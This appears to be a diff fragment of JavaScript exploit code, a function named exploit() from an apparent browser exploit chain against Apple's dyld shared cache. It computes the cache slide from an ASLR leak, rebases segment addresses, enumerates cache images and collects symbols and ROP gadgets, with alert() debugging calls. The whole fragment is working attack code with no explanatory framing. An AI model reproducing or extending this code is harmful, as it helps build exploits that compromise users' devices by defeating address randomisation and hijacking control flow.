@@ -580,11 +580,11 @@ function exploit(){
         {
             fail("base_seg");
         }
-        var cache_slide = Sub(hdr, base_seg.addr);
+        var cache_slide = hdr - base_seg.addr
         alert ("cacheslides" + cache_slide + "vs aslr leak slide" + slide);
         for(var i = 0; i < segs.length; ++i)
         {
-            segs[i].addr = Add(segs[i].addr, slide);
+            segs[i].addr += slide
         }
         var libs =
         {
@@ -648,10 +648,10 @@ function exploit(){
 
         var syms = {};
         var gadgets = {};
-        var imgs  = Add(hdr, memory.u32(Add(hdr, 0x18)));
-        alert(Add(hdr, r32(Add(hdr,0x18))))
+        var imgs  = hdr + memory.u32(hdr + 0x18);
+       // alert(Add(hdr, r32(Add(hdr,0x18))))
         alert("dyld cache images@" + imgs);
-        var nimgs = memory.u32(Add(hdr, 0x1c));
+        var nimgs = memory.u32(hdr + 0x1c);
         alert("number of cache libs=" + nimgs);
         for(var i = 0; i < nimgs; ++i)
         {
@@ -660,7 +660,7 @@ function exploit(){
             {
                 return memory.read(Add(straddr, i), 1)[0];
             };
-            var base = Add(memory.readInt64(imgs + i * 0x20), cache_slide);
+            var base = Add(memory.readInt64(imgs + i * 0x20), slide);
             alert(base)
             //alert("r32"+Add(r32(Add(imgs, i * 0x20),cache_slide)))
             if(opcode_libs.some(lib => strcmp(fn, lib)))
